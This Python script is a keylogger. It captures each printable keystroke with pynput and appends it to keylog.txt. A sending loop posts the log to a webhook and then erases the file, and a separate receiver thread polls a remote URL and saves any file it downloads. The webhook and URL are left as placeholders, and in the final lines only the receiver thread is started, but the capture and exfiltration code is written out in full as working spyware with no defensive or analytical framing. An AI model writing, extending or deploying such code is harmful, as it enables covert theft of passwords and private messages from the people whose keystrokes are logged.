from pynput import keyboard
from dhooks import Webhook
import threading
import requests
#import json
import time

#----------------------------------------------------------------------
#multithreading
#rdm_sec = [500,600,700,800,900]
# This function runs every time a key is pressed
def on_press(key):
    try:
        # Try to get the printable character
        log = key.char
#        hook.send(log) #slow
#error handler
    except AttributeError:
        return


    # Save to file
    with open("keylog.txt", "a") as file:
        file.write(log)


#----------------------------------------------------------------------

def llistener():

    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

#----------------------------------------------------------------------
#send content of file function

hook = Webhook ("web hook here")

def send():
    while True:
        print("send loop")


        with open("keylog.txt", "r") as file:
            content = file.read()
        if not content.strip():
            print("go back")
            continue
        # data = "hello world test!"
        hook.send(content)
        print("sent")
        with open("keylog.txt", "r+") as con:
            print("erased")
            con.seek(0)
            con.truncate()
        time.sleep(100)


''''''


#comment
#    time.sleep(300)

#----------------------------------------------------------------------
def receiver():
    while True:
        try:

            url = "web upload/ "
            r = requests.get(url)

            if r.status_code == 200:
                # filename from server header or fallback
                filename = r.headers.get("Content-Disposition", "").split("filename=")[-1].strip('"') \
                    if "filename=" in r.headers.get("Content-Disposition", "") else "latest_file"

                with open(filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)

                print(f"File received and saved as {filename}")
                time.sleep(100)






        except Exception as e:
            print(f"[Receiver] Error: {e}")
            time.sleep(100)


#thread1 = threading.Thread(target=llistener, daemon=True)
#thread2 = threading.Thread(target=send, daemon=True)
thread3 = threading.Thread(target=receiver, daemon=True)
    # Start the threads
#thread1.start()
#thread2.start()
thread3.start()

while True:
     pass







